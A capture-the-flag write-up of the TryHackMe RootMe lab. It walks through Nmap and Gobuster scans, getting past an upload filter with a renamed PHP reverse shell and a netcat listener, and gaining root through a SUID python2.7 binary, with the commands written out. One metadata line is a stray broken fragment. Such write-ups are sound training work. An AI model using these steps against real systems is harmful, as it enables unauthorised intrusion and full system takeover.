# TryHackMe - RootMe

## Metadata
- **Challenge Name**: RootMe
- **Difficulty**: Easy
- **Platform**: TryHackMe
- **Date of Engagement**: November 4, 2025
inconsistent; using placeholder for consistency)

## Executive Summary
This report details the penetration testing engagement on the RootMe challenge from TryHackMe. The objective was to gain initial access to the target system, escalate privileges to root, and capture both user and root flags. The engagement followed a structured methodology including reconnaissance, enumeration, exploitation, and privilege escalation. Key findings include vulnerabilities in file upload mechanisms and SUID binaries. The engagement was successful, with both flags captured.

## Methodology
- **Tools Used**: Nmap, Gobuster, PHP Reverse Shell, Netcat, Python
- **Approach**: Passive and active reconnaissance, web application enumeration, file upload exploitation, shell stabilization, privilege escalation via SUID binaries.

## Reconnaissance
### Port Scanning with Nmap
Performed an initial port scan to identify open services on the target.

**Command**:
```
nmap -sC -sV <TARGET_IP> -oN nmap_report
```

**Output**:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 19:41 WIB
Nmap scan report for <TARGET_IP>
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 59:89:43:38:a1:aa:1a:f2:60:ad:c7:78:7c:61:7c:5d (RSA)
|   256 48:56:38:0a:00:7e:16:6c:3b:88:59:e3:60:a3:89:d9 (ECDSA)
|_  256 9f:b0:bd:fd:2e:e6:bc:e4:02:1e:49:88:c3:b7:14:2c (ED25519)
80/tcp open  http    Apache/2.4.41 (Ubuntu)
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.72 seconds
```

**Findings**:
- Port 22 (SSH) open with OpenSSH 8.2p1 on Ubuntu.
- Port 80 (HTTP) open with Apache 2.4.41 on Ubuntu.
- OS identified as Linux (Ubuntu).

## Enumeration
### Directory Brute-Forcing with Gobuster
Enumerated web directories to discover hidden paths.

**Command**:
```
gobuster dir -u http://<TARGET_IP> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

**Output** (Partial):
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<TARGET_IP>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 318] [--> http://<TARGET_IP>/uploads/]
/css                  (Status: 301) [Size: 314] [--> http://<TARGET_IP>/css/]
/js                   (Status: 301) [Size: 313] [--> http://<TARGET_IP>/js/]
/panel                (Status: 301) [Size: 316] [--> http://<TARGET_IP>/panel/]
Progress: 10052 / 207644 (4.84%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 10053 / 207644 (4.84%)
===============================================================
Finished
===============================================================
```

**Findings**:
- Discovered directories: /uploads, /css, /js, /panel.
- /panel likely contains an upload panel, which could be vulnerable to file upload attacks.

## Exploitation / Initial Access
### File Upload Vulnerability
Identified a file upload panel at /panel/. Exploited it by uploading a modified PHP reverse shell.

**Steps**:
1. Cloned the PHP reverse shell repository.
   ```
   git clone https://github.com/pentestmonkey/php-reverse-shell
   ```

2. Modified the shell file to avoid upload restrictions (changed extension to .php5).
   ```
   cp php-reverse-shell.php php-reverse-shell.php5
   ```

3. Uploaded the modified shell to /panel/ via the web interface.

4. Set up a Netcat listener on the attacking machine.
   ```
   nc -lvnp 4444
   ```

5. Triggered the shell by accessing the uploaded file via browser or curl.

6. Stabilized the shell using Python.
   ```
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```

**Result**: Gained a user-level shell on the target.

## Privilege Escalation
### SUID Binary Exploitation
Searched for SUID binaries to find privilege escalation vectors.

**Command**:
```
find / -type f -user root -perm -4000 2>/dev/null
```

**Output** (Partial):
```
/usr/bin/python2.7
/usr/bin/sudo
...
```

**Findings**: Python2.7 has SUID permissions, allowing execution as root.

**Exploitation**:
Used Python to spawn a root shell.
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Verification**:
```
# whoami
root
```

## Post-Exploitation
### Flag Capture
1. Located and captured the user flag.
   ```
   find / -type f -name user.txt 2>/dev/null
   cat /var/www/user.txt
   ```
   **Flag**: THM{******************}

2. Located and captured the root flag.
   ```
   ls -la /root
   cat /root/root.txt
   ```
   **Flag**: THM{******************}

## Conclusion
The RootMe challenge was successfully completed, demonstrating common vulnerabilities in web applications and Linux privilege escalation. Key takeaways include the importance of securing file upload mechanisms and monitoring SUID binaries. This engagement highlights the need for robust input validation and least privilege principles in system administration.

